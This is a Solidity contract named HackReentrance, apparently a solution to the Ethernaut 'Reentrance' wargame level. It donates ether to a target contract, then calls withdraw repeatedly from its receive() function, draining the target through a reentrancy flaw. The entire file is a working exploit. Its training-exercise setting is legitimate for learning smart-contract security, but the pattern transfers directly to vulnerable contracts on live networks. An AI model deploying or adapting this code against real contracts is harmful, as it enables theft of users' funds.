// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../ethernaut/Reentrance.sol";

contract HackReentrance {

    Reentrance private _reentrance;
    
    constructor(address payable reentranceAddress) public {
        _reentrance = Reentrance(reentranceAddress);
    }

    function contribute() external payable {
        (bool success, ) = address(_reentrance).call{value: msg.value}(
            abi.encodeWithSignature("donate(address)", address(this))
        );  
        require(success, "HackReentrance: failed to contribute to reentrance");
    }

    function _withdrawBalance() public {
        uint balance = _reentrance.balanceOf(address(this));
        _reentrance.withdraw(balance);
    }

    function beginAttack() external {
        _withdrawBalance();  
    }

    receive() external payable {
        _withdrawBalance();   
    }
    
}